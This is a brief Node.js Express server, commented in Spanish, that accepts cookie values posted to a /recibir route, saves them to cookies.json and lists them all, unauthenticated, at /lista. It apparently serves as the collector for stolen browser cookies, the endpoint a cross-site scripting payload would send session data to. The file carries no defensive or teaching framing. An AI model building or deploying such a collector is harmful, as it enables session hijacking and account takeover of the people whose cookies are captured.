const express = require('express');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

// Ruta para recibir las cookies
app.post('/recibir', express.text(), (req, res) => {
    const cookie = req.body;
    console.log('Cookie recibida:', cookie);

    // Leer el archivo JSON existente
    let cookies = [];
    if (fs.existsSync('cookies.json')) {
        const data = fs.readFileSync('cookies.json');
        cookies = JSON.parse(data);
    }

    // Agregar la nueva cookie al array
    cookies.push(cookie);

    // Escribir el array actualizado de cookies de vuelta al archivo JSON
    fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));

    res.send('Cookie recibida y almacenada');
});

// Ruta para obtener la lista de cookies
app.get('/lista', (req, res) => {
    if (fs.existsSync('cookies.json')) {
        const data = fs.readFileSync('cookies.json');
        res.json(JSON.parse(data));
    } else {
        res.json([]);
    }
});

app.listen(port, () => {
    console.log(`Servidor escuchando en el puerto ${port}`);
});
